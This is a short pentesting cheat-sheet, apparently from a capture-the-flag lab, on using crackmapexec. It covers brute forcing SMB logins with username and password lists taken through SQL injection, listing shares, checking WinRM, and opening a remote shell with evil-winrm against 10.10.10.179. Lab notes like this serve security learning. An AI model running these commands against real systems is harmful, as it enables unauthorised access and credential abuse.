# crackmapexec

* Common Services like ldap, smb, winrm, ssh, ... brute forcing tool
* We need a list of users and password.
  * This list could be extracted usernames and password from database using SQLi
  * We may need to further enumerate usernames from domain using SQLi
  * As we don't know which user is assigned which password, we could use crackmapexec for this.

### Get Username and Password

* `crackmapexec smb 10.10.10.179 -u usernames.txt -p passwords.txt`
  * You will get _foundUsername_ and _foundPassword_ from this.

### SMB Enumeration

* `crackmapexec smb 10.10.10.179 -u foundUsername -p foundPassword --shares`

### Winrm Enumeration

* `crackmapexec winrm 10.10.10.179 -u foundUsername -p foundPassword`
  * This will show if the machine is vulnerable or not.
* `evil-winrm -i 10.10.10.179 -u megacorp\\foundUsername -p foundPassword`



